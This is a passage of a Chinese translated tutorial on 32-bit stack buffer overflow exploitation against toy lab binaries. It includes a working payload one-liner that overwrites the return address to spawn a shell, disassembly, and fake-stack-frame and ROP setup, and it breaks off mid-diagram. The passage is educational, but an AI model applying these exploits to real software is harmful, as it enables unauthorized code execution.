**译者的程序分析**
我先看看代码，再翻译作者的文章。我们看到，在exploitable()函数中，设置了16字节的缓冲区，但是值得我们注意的是scanf函数没有安全的使用，这导致我们可以写入超过16字节，这就导致了缓冲区溢出的可能。我们用注意到，有个函数调用了sytem("/bin/sh")，这里我们就可以假设，如果我们可以操作函数调转，去调用grant()函数，我们就可以拿到shell了。
基本上思路就是这样的。
读取程序的内存映射，我们可以看到它的栈是只读/ 不可执行的。
**让我们尝试控制EIP**
由于scanf不执行绑定的check，因此我们可以通过覆盖函数的返回地址来指向某个已知位置来控制EIP。我会尝试指向它grant()达到getshell的目的。我们可以通过objdum工具，来获取grant()的地址。
除了利用objdump来看，当然我们还是可以用IDA查找的。
objdump命令如下
    $ objdump -d ./hack_me_2 | grep grant
结果应该看起来是这样的
    080484cb ：
     8048516：e8 b0 ff ff ff call 80484cb 
接下来就是写exp，达到目的了。
    $（python -c'print“A”* 28 +“ xcb  x84  x04  x08”' ; cat  - ）| ./hack_me_2
**这里译者补充几点**
第一:
为什么是28个字节？这个是需要我们自己去分析的，我们需要计算两者直接字节数的值，才好控制跳转，毕竟本文是基于我们了解缓冲区溢出知识后的，如果有疑问，可以留言，或者自寻百度。
第二: 从代码来看，我们可以知道原文作者的环境是基于32位的，所以这里需要了解一下小端的知识。
运行上述代码之后，我们就可以成功getshell了。
很明显，大多数程序不会为你调用shell这个很容易，我们需要修改程序让demo更贴近现实一点。
    #include 
    #include 
    #include 
    #include 
    char *shell = "/bin/sh";
    void grant() {
       system("cowsay try again");
    }
    void exploitable() {
       char buffer[16];
       scanf("%s", buffer);
       if(strcmp(buffer,"pwned") == 0) grant();
       else  puts("Nice tryn");
    }
    int main(){
       exploitable();
       return 0;
    }
运行先前的exp，我们发现并没有getshell，那么我们怎么去调用sysytem(“/bin/sh”)呢？
分析，这次的程序并没有直接调用 system("/bin/sh")了，但是漏洞产生的原理和之前的一样。就不再复述了。
**调用函数约定**
当反汇编我们的代码看起来像这样的:
    080484cb ：
     80484cb：55 push％ebp
     80484cc：89 e5 mov％esp，％ebp
     80484ce：83 ec 08 sub $ 0x8，％esp
     80484d1：83 ec 0c sub $ 0xc，％esp
     80484d4：68 e8 85 04 08 push $ 0x80485e8
    80484d9：e8 b2 fe ff ff call 8048390 
     80484de：83 c4 10 add $ 0x10，％esp
     80484e1：90 nop
     80484e2：c9 leave
     80484e3：c3 ret
    080484e4 ：
     8048516：e8 b0 ff ff ff call 80484cb 
     804851b：eb 10 jmp 804852d 
让我们简单看看每个指令的作用。
在可利用的情况下，我们调用grant（）使用指令去做两件事情，推送下一个地址0x0804851b到堆栈，并更改EIP为0x080484cb
到grant()所在的地址
    push   %ebp    
    mov %esp,%ebp
这是函数的初始化。它为当前函数设置堆栈框架。它通过push之前保存的一堆栈帧的基指针，然后将当前基指针更改为堆栈指针（$ ebp = $
esp）。现在grant（）可以使用它的栈来存储变量和whatnot。
之后，它通过从esp中减去来为局部变量分配空间（因为堆栈增长），最后0x080485e8在调用之前将地址压入堆栈，system()它是指向将作为参数传递的字符串的指针system()，它有点像
    system(*0x80485e8)
最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。
**构建我们自己的堆栈帧**
我们已经看到了当函数被调用时堆栈的行为，这意味着
我们可以构造我们自己的堆栈帧
控制参数到我们跳转到的函数
确定此函数返回的位置
如果我们控制这两者之间的堆栈，我们可以控制返回函数的参数
通过ROP链接在多个函数中跳转
从objdump我们看到“/ bin / sh”的地址是 0x080485E0
    $ objdump -s -j .rodata hack_me_3
    hack_me_3:     file format elf32-i386
    Contents of section .rodata:
    80485d8 03000000 01000200 2f62696e 2f736800  ......../bin/sh.
    80485e8 636f7773 61792074 72792061 6761696e  cowsay try again
    80485f8 00257300 70776e65 64004e69 63652074  .%s.pwned.Nice t
    8048608 72790a00
我们构造一个“假”的堆栈结构，然后修改函数的返回地址，这样的堆栈结构如下:
    ADDRESS       DATA
    ........
     // exploitable() stack
    0xbfff0004    80 48 4d 90  